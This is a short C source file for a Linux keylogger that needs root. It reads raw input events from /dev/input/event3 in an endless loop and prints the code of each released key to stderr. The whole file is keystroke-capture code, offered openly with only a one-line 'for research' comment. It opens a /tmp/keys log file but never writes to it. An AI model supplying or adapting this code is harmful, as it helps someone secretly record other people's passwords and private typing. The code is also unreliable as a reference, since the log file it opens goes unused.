// A simple keylogger.
// For research and a project.
// Requires root access.
#include <stdio.h>
#include <linux/input.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <unistd.h>

#define KEYSTROKE "/tmp/keys"

int main()
{
    struct input_event ev;
	int fd = open("/dev/input/event3", O_RDONLY);
	FILE *fp = fopen(KEYSTROKE, "a");

    while(1)
	{
		read(fd, &ev, sizeof(ev));
		if ((ev.type == EV_KEY) && (ev.value == 0))
		{
            fprintf(stderr, "%d\n", ev.code);
		}
	}
	fclose(fp);
	close(fd);
}